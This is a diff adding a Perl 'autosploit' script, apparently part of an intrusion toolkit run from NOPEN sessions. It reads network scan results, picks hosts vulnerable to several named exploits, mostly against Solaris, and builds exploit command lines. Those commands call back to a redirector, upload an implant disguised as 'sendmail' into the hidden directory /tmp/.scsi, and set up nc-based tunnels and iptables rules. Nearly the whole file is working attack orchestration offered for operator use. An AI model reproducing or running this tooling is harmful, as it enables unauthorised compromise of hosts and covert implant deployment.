@@ -1,0 +1,714 @@
+#!/usr/bin/env perl
+# 
+# TODO: If we go back to callFORWARDs:
+# add to didthis for successful exploits
+# if multiple attempts, subsequent ones use port from didthis if there.
+
+
+## TODO FIX STDERR OUTPUT NOT ALL YS SHOWN BEFORE PROMPT...
+
+## PROBLEM: After first build of db, running a gs exploit runs an empty scripme:
+## [7793] Task (ARCH= TARGETIP=555.1.3.18 )
+## Not sure why.
+## FIX: Ok, then build AND read the database the first time.
+##
+
+
+$VER="2.1.0.4" ;
+# nopen seems happier with stderr in lsh runs
+# or does it? put it after usage now
+#select STDERR ;
+$| = 1 ;
+$ext = $$ ; # limits likelihood of concurrent autodone's colliding
+            # BUT: still possible.
+            # not too likely to happen.
+# myinit() either reads the scans files and builds a database or
+# reads in the database, whichever makes sense based on file
+# timestamps.
+myinit() ;
+# We can populate
+unlink("$opetc/autosploitnext.$ext") ;
+open(NOPENOUT,"> $opetc/autosploitnext.$ext") ||
+  mydie("cannot open $opetc/autosploitnext.$ext");
+localdoit("#NOGS") ;
+localdoit("-lsh mv $opetc/autosploitnext $opetc/autosploitnext.last.\$\$ 2>/dev/null");
+unless ($calledfromautoscans or $scannedtargets) {
+  $what = "broadcast(s)" ;
+  if ($gsoptions) {
+    $what = " $gsoptions\nand maybe $what" ;
+  }
+  $_ = getinput("No targets scanned yet. Scan $what with brpc,rpc,xwin,mibiisa?","Y");
+  if (/^y/i) {
+    localdoit("-lcd /current/down") ;
+    localdoit("-gs scans $gsoptions FROMAUTOSPLOIT");
+  } else {
+    localdoit("#   BAILING $prog $gsoptions");
+  }
+  close(NOPENOUT);
+  rename("$opetc/autosploitnext.$ext","$opetc/autosploitnext");
+  exit ;
+}
+mydie("No scans to parse in $opdown/cmdout/scans*") unless ($scannedtargets);
+mydie("No vulnerable hosts found in $opdown/cmdout/scans*") unless (@vulnerabletargets);
+
+`rm -f  /tmp/scripme.after.*` ;
+# If @ARGV is set it is via environment variable gsoptions from
+# the -gs sploit target1 target2 line and provides the target IPs
+# from the user.
+$_ = $gsoptions ;
+foreach (split) {
+  if ($vulnerabletargets{$_}) {
+    push(@dotargets,$_);
+  } else {
+    if ($scannedtargets{$_}) {
+      progprint("Ignoring $_: This IP has responded to scans but is not vulnerable yet.",$COLOR_FAILURE) ;
+    } elsif (!$calledfromautoscans and !$broadcasts{$_} and !$scannednow{$_}) { # just ignore broadcasts here
+      $ans = getinput("\n\n$_ has not yet been scanned. Scan it now?","Y") ;
+      if ($ans =~ /y/i) {
+	$scanips .= " $_" ;
+	$scannednow{$_}++;      }
+    }
+  }
+}
+if ($scanips) {
+#  if (@dotargets) {
+#    progprint("\n\nSkipping these vulnerable targets for now:\n@dotargets \n\n".
+#	      "you need to re-sploit them later.",
+#	      $COLOR_FAILURE) ;
+#  }
+  localdoit("-gs scans $scanips FROMAUTOSPLOIT");
+# no don't do this next - gs.scans will sploit them
+#  localdoit("-gs sploit $scanips @dotargets") unless $calledfromautoscans ;
+  close(NOPENOUT);
+  rename("$opetc/autosploitnext.$ext","$opetc/autosploitnext");
+  exit ;
+}
+unless (@dotargets) {
+  if (@vulnerabletargets == 1) {
+    @dotargets = @vulnerabletargets ;
+  } else {
+    $_ = getinput("\nEnter IP(s) to sploit, whitespace delimited: ") ;
+    foreach (split) {
+      if ($nopen_rhostname =~ /\.$_$/) {
+	progprint("Ignoring $_: Not going to whack self.",$COLOR_FAILURE) ;
+	next;
+      }
+      # throw away any args not IPs
+      if (ipcheck($_)) {
+	if ( $vulnerabletargets{$_}) {
+	  push(@dotargets,$_) ;
+	} else {
+	  progprint("Ignoring $_: scanned but not a vulnerable IP",$COLOR_FAILURE) ;
+	}
+      } else {
+	progprint("Ignoring $_: not a valid IP",$COLOR_FAILURE) ;
+      }
+    }
+  }
+}
+if (@dotargets == 1) {
+  $thereisonlyonetarget++ ;
+  $against = " against $dotargets[0]" ;
+}
+foreach $target (@dotargets) {
+  $loopedonce++ ;
+  @sploits = () ;
+  push(@sploits,"BS") if ($sploits{$target} =~ /BS/) ;
+  push(@sploits,"YS") if ($sploits{$target} =~ /YS/) ;
+  push(@sploits,"GS") if ($sploits{$target} =~ /GS/) ;
+  push(@sploits,"CM") if ($sploits{$target} =~ /CM/) ;
+  print "$COLOR_FAILURE" ;
+  foreach $sploit (@sploits) {
+    print($prompt{$target.$sploit}."\n") ;
+  }
+  print "$COLOR_NORMAL\n\n" ;
+  $vulnerablecount++ if (@sploits) ;
+}
+select STDERR ;
+unless ($loopedonce) {
+  progprint("No vulnerable targets provided--bailing.",$COLOR_FAILURE);
+} else {
+  unless ($vulnerablecount) {
+    if (@dotargets > 1) {
+      progprint("These targets are not vulnerable: @dotargets",$COLOR_FAILURE) ;
+    } else {
+      progprint("This target is not vulnerable: @dotargets",$COLOR_FAILURE) ;
+    }
+    # do not exit here--allow dropping through to rename autonext
+    @dotargets = () ;
+  } else {
+    progprint("\n\nOne or more windows per target/sploit chosen will pop up.\n\n") ;
+  }
+}
+TARGET: foreach $target (@dotargets) {
+  @sploits = () ;
+  push(@sploits,"BS") if ($sploits{$target} =~ /BS/) ;
+  push(@sploits,"YS") if ($sploits{$target} =~ /YS/) ;
+  push(@sploits,"GS") if ($sploits{$target} =~ /GS/) ;
+  push(@sploits,"CM") if ($sploits{$target} =~ /CM/) ;
+  progprint("\nYou have a choice against $target: @sploits") if (@sploits > 1) ;
+  foreach $sploit (@sploits) {
+    $targetsploit = $target.$sploit ;
+    my $after = "" ;
+    next if $doneit{$targetsploit}++ ;
+    if ( $thereisonlyonetarget or  @sploits > 1 ) {
+      if ($thereisonlyonetarget and  @sploits == 1 ) {
+	progprint("\nYou have exactly one shot$against: $sploit against $target.",$COLOR_FAILURE);
+      }
+      my $ans = getinput("\n\nDo you want to try $sploit on $target? (Yes,No,Done)","N","Y","D") ;
+      last TARGET if  ($ans =~ /^d/i) ;
+      next unless ($ans =~ /^y/i) ;
+    }
+    progprint("Sploiting: $target with $sploit") ;
+    $sploitingsome++ ;
+    chomp($tmpport = `mkrandom -n 2>/dev/null`) ;
+    if (open(OUT2,"> /tmp/scripme.after.$$.$sploit.$target")) {
+      print OUT2 "REMINDER: At some point, if the call back works, try a call forward.
+Pastables using a random for call forward (in two different windows, on different hosts):
+
+-listen pick-your-port
+
+-nstun $target pick-your-port
+" ;
+      close OUT2 ;
+      $after="AFTERNOTE=\"/tmp/scripme.after.$$.$sploit.$target\"" ;
+    }
+    my $exploit = "" ;
+    $exploit = "ARCH=$arch{$targetsploit} TARGETIP=$target $sploitstr{$targetsploit}" ;
+    $hostname{$target} or $hostname{$target} =$xhostname{$target} ;
+
+    localdoit("-lsh $after EXPLOIT_SCRIPME=\"$exploit\" ".
+      "scripme -X \"-geometry 90x64\" -F -t ${sploit}EXPLOIT.$hostname{$target}.$target 2>&1");
+  } # end foreach $sploit
+} # end foreach $target
+select STDOUT ;
+if ($sploitingsome) {
+  setuptunnelscripts();
+  progprint("Setting up -tunnel $tunnelport udp.\n$COLOR_FAILURE\n".
+	    "Use \"stattunnel\" at a command line or with -lsh to see the current tunnel statistics,\n".
+	    "and \"closetunnel\" when done with all exploits using the tunnel.\n\n") ;
+
+  localdoit(
+     "# running $opetc/autosploitnext on $nopen_rhostname output in $nopen_mylog",
+     "-lsh echo -e \"\\\\n\\\\n\\\\nSetting up tunneling on port $tunnelport\\\\n\\\\nClose tunnel with this (locally, in another window) when done:\\\\n\\\\n/current/bin/closetunnel\\\\n\\\\n\"",
+     "-tunnel $tunnelport udp",
+    ) ;
+} # if ($sploitingsome)
+
+close(NOPENOUT);
+
+# must always do these
+# following is first time autosploitnext is used without $$ extension--fewer collisions?
+rename("$opetc/autosploitnext.$ext","$opetc/autosploitnext");
+
+#sub mywarn {
+#  local ($what,$color,$color2,$what2) = (@_) ;
+#  $color = $COLOR_WARNING unless $color ;
+#  $color2 = $color unless $color2 ;
+#  $what2 = " $what2" if ($what2) ;
+##  local (@stuff) = (@_,$hopping) ;
+#  warn  "${color2}${prog}[$$]$what2\a: ${color}$what$COLOR_NORMAL\n" ;
+##  warn "\n${COLOR_WARNING}\a@_$COLOR_NORMAL\n" ;
+#}#mywarn
+
+#sub mydie {
+#  local ($what,$color,$color2,$what2) = (@_) ;
+#  $color = $COLOR_FAILURE unless $color ;
+#  $color2 = $color unless $color2 ;
+#  $what2 = " $what2" if ($what2) ;
+##  local (@stuff) = (@_,$hopping) ;
+#  warn  "${color2}${prog}[$$]$what2\a: ${color}$what$COLOR_NORMAL\n" ;
+##"\n${COLOR_FAILURE}\a$what $hopping$COLOR_NORMAL\n" ;
+#  exit 1;
+#}
+
+#sub usage {
+#  unlink("$opetc/autosploitnext");
+#  open(OUT,">> $opetc/autosploitnext");
+#  print OUT ("#NOGS\n") ;
+#  close(OUT);
+#  print "\nFATAL ERROR: @_\n" if ( @_ );
+#  $usagetext = $gsusagetext if ($nopen_mypid) ;
+#  print $usagetext unless $opt_v ;
+#  print $vertext ;
+#  print "\nFATAL ERROR: @_\n" if ( @_ );
+#  exit;
+#} # end sub usage
+
+sub myinit {
+  my $autoutils = "../etc/autoutils" ;
+  unless (-e $autoutils) {
+    $autoutils = "/current/etc/autoutils" ;
+  }
+  require $autoutils;
+
+  mydie("bad option(s)") if (! Getopts( "hvTRL" ) ) ;
+
+  # $autoutils sets $gsoptions to "@ARGV", do that again after Getopts.
+  $gsoptions = "";
+  foreach (@ARGV) {
+    # quietly throw away any args not IPs
+    $gsoptions .= "$_ " if (ipcheck($_)) ;
+    $calledfromautosploit++ if ($_ eq "FROMAUTOSPLOIT") ;
+    $calledfromautoscans++ if ($_ eq "FROMAUTOSCANS") ;
+  }
+
+  $opt_R++ if $opt_L;
+  $dolocal = $opt_L ? " -L" : "";
+  $workdir = "/tmp/.scsi" ;
+  $ratname = "sendmail" ;
+  if (-s "$opdown/cmdout/scans.$nopen_rhostname") {
+    $scanfile = "$opdown/cmdout/scans.$nopen_rhostname" ;
+    $dbfile = "$opdown/cmdout/scans.$nopen_rhostname.db" ;
+  } elsif (-s "$opdown/cmdout/scans.$nopen_rhostname_with_badchars") {
+    $scanfile = "$opdown/cmdout/scans.$nopen_rhostname_with_badchars";
+    $dbfile = "$opdown/cmdout/scans.$nopen_rhostname_with_badchars.db";
+  } else {
+    $scanfile = "$opdown/cmdout/scans" ;
+    $dbfile = "$opdown/cmdout/scans.db" ;
+  }
+  if (-s $dbfile) {
+    my $dbage = -M $dbfile ;
+    my $scanage = -M $scanfile ;
+    $gotdb++ if ( $dbage <  $scanage) ;
+  }
+  @broadcasts = split(/\n/,`grep "Broadcast" "$opdown/hostinfo.$nopen_rhostname" 2>/dev/null | awk '{print \$7}'`) ;
+  $broadcasts{$_}++ foreach (@broadcasts) ;
+  $gsusagetext="
+Usage: -gs sploit [options] [ IP1 [ IP2 ... ] ]
+
+OPTIONS
+
+  -h     This usage statement.
+  -L     will NOT ignore scans against 127.0.0.1 (default does)
+  -R     Rebuild the scans.$nopen_rhostname.db file
+         (automatic if new scans have been done).
+
+-gs sploit calls $opetc/autosploit [ IP1 [ IP2 ... ] ].
+
+* If no IPs are given, all scanned IPs that may be vulnerable may be
+  sploited, depending on your answers to the prompts given.
+
+* If one or more IPs are provided, those are the hosts sploited.
+
+* If no scans have yet been done, you are asked whether you wish to
+  scan the broadcast address(es) (as well as any IPs provided) with
+  these: brpc, rpc, xwin and mibiisa.
+
+Before an IP can be sploited, it must have BOTH answered one or more
+scans, AND those results must indicate the host could be vulnerable.
+
+The file $scanfile is parsed
+into $dbfile, containing
+the necessary data to proceed with sploits against IPs vulnerable to
+the exploits this script is aware of (currently BS, YS and GS). If the
+.db file is older than the scans file, the database is rebuilt.
+
+";
+  $usagetext="
+Usage: $prog [-h]                     (prints this usage statement)
+
+NOT CALLED DIRECTLY
+
+$prog is run from within a NOPEN session when \"-gs sploit\" is used.
+See \"-gs sploit -h\" for more help.
+
+";
+  usage() if ($opt_h or $opt_v) ;
+  if ($opt_T) {
+    setuptunnelscripts() ;
+    exit;
+  }
+  $rebuilddb = $opt_R ;
+  progprint("Called as: $0 @ARGV\n\n");
+#  mydie("No user servicable parts inside.\n".
+#	"(I.e., noclient calls $prog, not you.)\n".
+#	"$vertext") unless $nopen_rhostname;
+  if ($nopen_rhostname) {
+    $calledfromnopen=1 ;
+  } else {
+    $calledfromnopen=0 ;
+  }
+  @scannedtargets = split(/\n/,`parsescan$dolocal -f "$scanfile"`) ;
+  $scannedtargets = @scannedtargets ;
+  if ($scannedtargets) {
+    if (!$gotdb or $rebuilddb) {
+      builddb() ;
+#die("DBG: Check the .db file");
+    }
+    readdb() ;
+  }
+}#myinit
+
+sub progprint {
+  local ($what,$color,$color2,$what2) = (@_) ;
+  local $newlines ;
+  $color = $COLOR_NOTE unless $color ;
+  $color2 = $color unless $color2 ;
+  $what2 = " $what2" if ($what2) ;
+#  select STDERR ;
+  while (substr($what,0,1) eq "\n") {
+    $newlines .= "\n";
+    $what = substr($what,1) ;
+  }
+  $| = 1;
+  print "$newlines${color2}${prog}[$$]$what2: ${color}$what$COLOR_NORMAL\n" ;
+}#progprint
+sub getinput {
+  local($prompt,$default,@allowed) = @_;
+  local($ans,$tmp,%other) = ();
+  $other{"Y"} = "N" ; $other{"N"} = "Y" ;
+  if ($other{$default} and ! (@allowed)) {
+    push(@allowed,$other{$default}) ;
+  }
+  $tmp = $default;
+  if (chop($tmp) eq "") {
+    #damn ^M's in script files
+    $default = $tmp;
+  }
+  SUB: while (1) {
+    print STDERR $prompt;
+    if ($default) {
+      print STDERR " [$default] ";
+    } else {
+      print STDERR " ";
+    }
+    chomp($ans = <STDIN>);
+    $ans = $default if ( $ans eq "" );
+    last SUB if ($#allowed < 0) ;
+    foreach ($default,@allowed) {
+      last SUB if $ans =~ /^$_/i ;
+    }
+  }
+  return $ans;
+}#getinput
+
+sub builddb {
+  # output of "..." when processing .db file will not show up 
+  # without select STDERR for whatever reason...
+  select STDERR ;
+  mydie("Cannot open $dbfile") unless (open(DB,"> $dbfile")) ;
+  progprint("Building $dbfile:\n");
+  print DB "Targets Scanned:    $scannedtargets\n";
+  my %uploadports = () ;
+  my %doneit = () ;
+  foreach $target (@scannedtargets) {
+    next if ($target eq "127.0.0.1" and !$dolocal) ;
+    chomp($cmportudp  = `parsescan$dolocal -f "$scanfile" -p 100068 -i $target -t udp`) ;
+    chomp($cmporttcp  = `parsescan$dolocal -f "$scanfile" -p 100068 -i $target -t tcp`) ;
+    chomp($bsport  = `parsescan$dolocal -f "$scanfile" -p 100232 -i $target`) ;
+    chomp($hostname  = `parsescan$dolocal -f "$scanfile" -n $target`) ;
+    chomp($redirip = `parsescan$dolocal -f "$scanfile" -r $target`) ;
+    chomp($xwin = `parsescan$dolocal -f "$scanfile" -x $target`) ;
+    chomp($gs = `parsescan$dolocal -f "$scanfile" -g $target`) ;
+    chomp($solver = `parsescan$dolocal -f "$scanfile" -o $target`) ;
+    chomp($arch = `parsescan$dolocal -f "$scanfile" -a $target`) ;
+    if ($gs and ! $arch) {
+      $arch = "sparc.sun.solaris" if ($gs =~ /ultra|sparc|blade/i) ;
+    }
+    $hardware = "" ;
+    if ($gs =~ /ultra|sparc|blade/i) {
+      ($hardware,$more) = $gs =~ /(ultra|sparc|blade)(\S*)/i ;
+      $hardware .= $more ;
+    }
+    my %sploits = () ;
+    my $done = 0 ;
+    until ($done) {
+      #note: $arch will have value iff target is Solaris and determines sparc vs. i386
+      # get random upload port for this one not already used
+      while (1) {
+	chomp($uploadport = `mkrandom -n 2>/dev/null`) ;
+	last unless $uploadport ; # mkrandom might not be there
+	next if (`netstat -an | grep $uploadport.*LISTEN`) ;
+	next if ( $uploadports{$uploadport}++ ) ;
+	last ;
+      }
+      # reset $targetsploit for this run through
+      my $targetsploit = "" ;
+      if ($bsport and $hostname and $redirip and ! $doneit{"$target$bsport$hostname$redirip"}++) {
+	$sploits{"BS"}++ ;
+	$targetsploit = "${target}BS" ;
+	$arch{$targetsploit} = $arch ;
+	$arch{$target} = $arch ;
+	($bsport{$target},$hostname{$target}) =
+	  ($bsport,$hostname);
+
+	$prompt{$targetsploit} = "can do BS ($bsport $hostname $redirip $arch):\t$target" ;
+	# Sploit string for BS with nopen callback
+#        $sploitstr{$targetsploit} = "bs.auto -c 127.0.0.1 $hostname $bsport $workdir $ratname $redirip $uploadport" ;
+	$sploitstr{$targetsploit} = "bs.auto -c -i 127.0.0.1 -u $bsport -D $workdir -r $ratname -l $redirip -n $uploadport $hostname" ;
+	$hitthese{"$targetsploit"} = $target ;
+	next ;
+      }
+      if ($gs and ! $doneit{"$target$gs"}++) {
+	$sploits{"GS"}++ ;
+	$targetsploit = "${target}GS" ;
+	$osver{$targetsploit} = "SunOS $gs" ;
+	my $which = "-g sneer" if ( $gs =~ /5.6/ or
+				    $solver =~ /sol2.[456]/i) ;
+	$which = "-g frowns" if ($gs =~ / -r /);
+	if ($gs eq "yes ") {
+	  $prompt{$targetsploit} = "can do GS ($arch):\t$target" ;
+	} else {
+	  $prompt{$targetsploit} = "can do GS ($gs $arch):\t$target" ;
+	}
+	($gs{$target}) =
+	  ($gs) ;
+	$t = "gs.auto $useksh -c $which -i 127.0.0.1 -l $redirip -n $uploadport -r $ratname -D $workdir" ;
+	$t =~ s/ +/ /g ;
+	$sploitstr{$targetsploit}  = $t ;
+	$hitthese{"$targetsploit"} = $target ;
+	next ;
+      }
+      if (($cmportudp or $cmporttcp) and ! $doneit{"$target$cmportudp$cmporttcp"}++) {
+	$sploits{"CM"}++ ;
+	$targetsploit = "${target}CM" ;
+	my ($targettype) = () ;
+	if ( "$gs$hardware" =~ /blade/i or "$gs$hardware" =~ /ultra-60/i ) {
+	  $targettype = "-T 0" ; # default to 2.8=0
+	  $targettype = "-T 1" if ( $gs =~ /5.9/) ;
+	} elsif ( "$gs$hardware" =~ /ultra-30/i ) {
+	  $targettype = "-T 2" ; # default to 2.6-8=2
+	  $targettype = "-T 4" if ( $gs =~ /5.9/) ;
+	} elsif ( "$gs$hardware" =~ /ultra/i ) {
+	  $targettype = "-T 2"  ;
+	} elsif ($arch eq "i386.pc.solaris" or $arch{$target} eq "i386.pc.solaris") {
+	  $targettype = "-T 5" ; # 5 works for 2.6-2.7 i386
+	  $targettype = "-T 6" if ( $gs =~ /5.8/) ;
+	} elsif ($hardware =~ /sparcstation/i ) {
+	  $targettype = "-T 3" ;
+	} elsif ($hardware =~ /sco/i ) {
+	  $targettype = "-T 9" ;
+# Make no guess otherwise
+#	} elsif ($arch eq "sparc" or $arch{$target} eq "sparc" ) {
+#	  $targettype = "-T 4" ;
+	}
+	$prompt{$targetsploit} = "can do CM via udp/$cmportudp ($arch):\t$target" if $cmportudp ;
+	$prompt{$targetsploit} = "can do CM via tcp/$cmporttcp ($arch):\t$target" unless $prompt{$targetsploit} ;
+	($cmportudp{$target}) = ($cmportudp) ;
+	($cmporttcp{$target}) = ($cmporttcp) ;
+	if ($cmportudp) {
+	  $t = "cmsex.auto $targettype $useksh -u $cmportudp -i 127.0.0.1 -l $redirip -r $ratname -D $workdir -n $uploadport -c" ;
+	} else { # stuck with tcp then
+	  $t = "cmsex.auto $targettype $useksh -t $cmporttcp -i 127.0.0.1 -l $redirip -r $ratname -D $workdir -n $uploadport -c" ;
+	}
+	$t =~ s/ +/ /g ;
+	$sploitstr{$targetsploit}  = $t ;
+	$hitthese{"$targetsploit"} = $target ;
+	next ;
+      }
+      if ($xwin and ! $doneit{"$target$xwin"}++) {
+	$sploits{"YS"}++ ;
+	$targetsploit = "${target}YS" ;
+	$arch{$targetsploit} = $arch{$target} ;
+	if ($xwin =~ /:/) {
+	  ($xhostname) = $xwin =~ /([^:]*):/ ;
+	} else {
+	  ($xhostname) = $xwin =~ /([^+]*)+/ ;
+	}
+	$prompt{$targetsploit} = "can do YS ($os\t$arch\t$xwin):\t$target" ;
+	($xwin{$target},$xhostname{$target}) =
+	  ($xwin,$xhostname) ;
+	$sploitstr{$targetsploit} = "ys.auto $useksh -i 127.0.0.1 -l $redirip -r $ratname -D $workdir -n $uploadport -c" ;
+	$hitthese{"$targetsploit"} = $target ;
+	next ;
+      }
+      $done++ ;
+      if ($arch) {
+	$arch{$target} = $arch unless $arch{$target} ;
+      }
+    } # end until $done
+    next unless (keys %sploits) ;
+    foreach $sploit (keys %sploits) {
+      $targetsploit = "$target$sploit" ;
+      if ($arch) {
+	$arch{$targetsploit} = $arch unless $arch{$targetsploit} ;
+      }
+      $redirip{$targetsploit} = $redirip ;
+      #    print($prompt{$targetsploit}."\n") ;
+      print(".") ;
+      print DB << "EOF" ;
+$target
+$sploit
+$prompt{$targetsploit}
+$arch{$targetsploit}
+$redirip{$targetsploit}
+$hostname{$target}
+$bsport{$target}
+$osver{$targetsploit}
+$gs{$target}
+$xwin{$target}
+$xhostname{$target}
+$sploitstr{$targetsploit}
+EOF
+      $sploits{$target} .= $sploit ;
+    } # end foreach $sploit
+  } # end foreach $targets
+  close(DB);
+  print("\n\n") ;
+  select STDOUT ;
+}#builddb
+
+sub readdb {
+  mydie("Cannot open $dbfile") unless (open(DB,"< $dbfile")) ;
+  @vulnerabletargets = () ;
+  select STDERR ;
+  %vulnerabletargets = () ;
+  progprint("Reading $dbfile:\n\n");
+  ($scannedtargets) = <DB> =~ /(\d+)$/ ;
+  until (eof DB) {
+    chomp($target = <DB>) ;
+    push(@vulnerabletargets,$target) unless $dbtargets{$target}++;
+    $vulnerabletargets{$target}++ ;
+    chomp($sploit = <DB>) ;
+    $sploits{$sploit}++ ;
+    $targetsploit =$target.$sploit ;
+    chomp($prompt{$targetsploit} = <DB>) ;
+    $hitthese{$targetsploit} = $target ;
+    chomp($arch{$targetsploit} = <DB>) ;
+    $arch{$target} = $arch{$targetsploit} ;
+    chomp($redirip{$targetsploit} = <DB>) ;
+    chomp($hostname{$target} = <DB>) ;
+    chomp($bsport{$target} = <DB>) ;
+    chomp($osver{$targetsploit} = <DB>) ;
+    chomp($gs{$target} = <DB>) ;
+    if ($gs{$target} and ! $arch{$targetsploit}) {
+      $arch{$targetsploit} = "sparc.sun.solaris" if ($gs{$target} =~ /ultra|sparc/i) ;
+    }
+    chomp($xwin{$target} = <DB>) ;
+    chomp($xhostname{$target} = <DB>) ;
+    chomp($sploitstr{$targetsploit} = <DB>) ;
+    $sploits{$target} .= $sploit ;
+    $hostname{$target} = $xhostname{$target} unless $hostname{$target};
+#    print($prompt{$targetsploit}."\n") ;
+    $prompt{$sploit}.=$prompt{$targetsploit}."\n" ;
+  }
+  close(DB);
+  my $output = "Targets scanned but not vulnerable: " ;
+  foreach (@scannedtargets) {
+    $scannedtargets{$_}++;
+    $output .= "\n\t$_" unless ($vulnerabletargets{$_}) ;
+  }
+  progprint($output."\n\nTargets scanned and possibly vulnerable:\n") ;
+  foreach (keys %sploits) {
+    print $prompt{$_}."\n" if (length($_) == 2) ;
+  }
+  $vulnerabletargets = @vulnerabletargets ;
+  progprint("\nTotal targets scanned:       $scannedtargets");
+  progprint("Targets possibly vulnerable: $vulnerabletargets");
+  select STDOUT ;
+}#readdb
+
+#sub ipcheck() {
+#  # returns 1 iff $ipstr is in dotted decimal notation with each 
+#  # octet between 0 and 255 inclusive (i.e. 0.0.0.0 and 255.255.255.255 are valid)
+#  local($ipstr,@junk) = @_;
+#  # need -1 in following split to keep null trailing fields (to reject "1.2.3.4.")
+#  @octets=split(/\./,$ipstr,-1);
+#  return 0 if ($#octets != 3);
+#  foreach (@octets) {
+#    # return 0 if (empty or nondigits or <0 or >255)
+#    return 0 if ($_ eq "" || ( /\D/ ) || $_ < 0 || $_ > 255);
+#  }
+#  return 1;
+#}#ipcheck
+sub setuptunnelscripts {
+  progprint("Creating stattunel, dotunnel and closetunnel.");
+  if (-s "$opbin/.tunnelport") {
+    # already have .tunnelport - use it
+    if (open(IN2,"< $opbin/.tunnelport")) {
+      chomp($tunnelport=<IN2>) ;
+      close(IN2);
+    }
+    if (`netstat -an | grep udp.*:$tunnelport`) {
+      mydie("CANNOT PROCEED: Another -sploit must be running and\n".
+	    "\"-tunnel $tunnelport udp\" is already underway.") unless $opt_T;
+    }
+    unless ($tunnelport > 0 and $tunnelport < 65534) {
+      $tunnelport = 0 ;
+      unlink("$opbin/.tunnelport");
+    }
+  }
+  until ($tunnelport > 0 and $tunnelport < 65534 and
+	 ($opt_T or ! `netstat -an | grep udp.*:$tunnelport`)) {
+    chomp($tunnelport = `mkrandom -n 38700 38800`);
+  }
+  if (open(OUT2,"> $opbin/.tunnelport")) {
+    print OUT2 "$tunnelport\n";
+    close(OUT2);
+  }
+  if (open(OUT2,"> $opbin/closetunnel")) {
+    print OUT2 <<"EOF";
+#!/bin/sh
+PORT=\$1
+[ "\$PORT" ] || PORT=\`cat $opbin/.tunnelport\`
+[ "\$PORT" ] || PORT=18787
+echo 'echo "c 1 2 3 4 5 6 7" | nc -w1 -u 127.0.0.1' \$PORT
+echo 'echo "q" | nc -w1 -u 127.0.0.1' \$PORT
+echo "c 1 2 3 4 5 6 7" | nc -w1 -u 127.0.0.1 \$PORT
+echo "q" | nc -w1 -u 127.0.0.1 \$PORT
+EOF
+  }
+  close(OUT2) ;
+  if (open(OUT2,"> $opbin/stattunnel")) {
+    print OUT2 <<"EOF";
+#!/bin/sh
+PORT=\$1
+[ "\$PORT" ] || PORT=\`cat $opbin/.tunnelport\`
+[ "\$PORT" ] || PORT=$tunnelport
+[ "\$PORT" ] || PORT=18787
+echo 'echo "s" | nc -w1 -u 127.0.0.1' \$PORT
+echo "s" | nc -w1 -u 127.0.0.1 \$PORT
+EOF
+  }
+  close(OUT2) ;
+  if (open(OUT2,"> $opbin/dotunnel")) {
+    print OUT2 <<"EOF";
+#!/bin/sh
+LINE=\${*}
+[ "\$PORT" ] || PORT=\`cat $opbin/.tunnelport\`
+[ "\$PORT" ] || PORT=$tunnelport
+[ "\$PORT" ] || PORT=18787
+if [ "\$LINE" ] ; then
+  echo echo \"\$LINE\" '| nc -w1 -u 127.0.0.1' \$PORT
+  echo "\$LINE" | nc -w1 -u 127.0.0.1 \$PORT
+else
+  echo 'echo "s" | nc -w1 -u 127.0.0.1' \$PORT
+  echo "s" | nc -w1 -u 127.0.0.1 \$PORT
+fi
+EOF
+  }
+  close(OUT2) ;
+  `chmod 755 $opbin/*tunnel` ;
+  unless (`iptables -L -n -v | grep $tunnelport`) {
+    `iptables -A INPUT --in-interface lo --proto udp --destination-port $tunnelport -j ACCEPT` ;
+    `iptables -A INPUT --proto udp --destination-port $tunnelport -j REJECT` ;
+  }
+  progprint("These iptables rules will only allow the lo interface to hit this port:\n\n".`iptables -L -n -v`) unless $opt_T;
+}#setuptunnelscripts
+
+sub localdoit {
+  local (@cmds) = (@_) ;
+  local $output = "" ;
+  my $where = "" ;
+  my $nohistthistime = "";
+  if ($cmds[$#cmds] =~ /(OUT|NONOHIST)$/) {
+    $where = pop(@cmds);
+    if ($1 eq "NONOHIST") {
+      $nohistthistime = $1 ;
+      $where = "" ;
+    }
+  }
+  $where = "NOPENOUT" unless $where ;
+  foreach $cmd (@cmds) {
+    my $h = "";
+    $h="-nohist " 
+    unless ($cmd eq "#NOGS" or
+            $nonohist or
+            $nohistthistime or
+            !($where eq "NOPENOUT")) ;
+    print $where ("$h$cmd\n");
+    $output .= "$h$cmd\n";
+  }
+  return $output ;
+}#localdoit
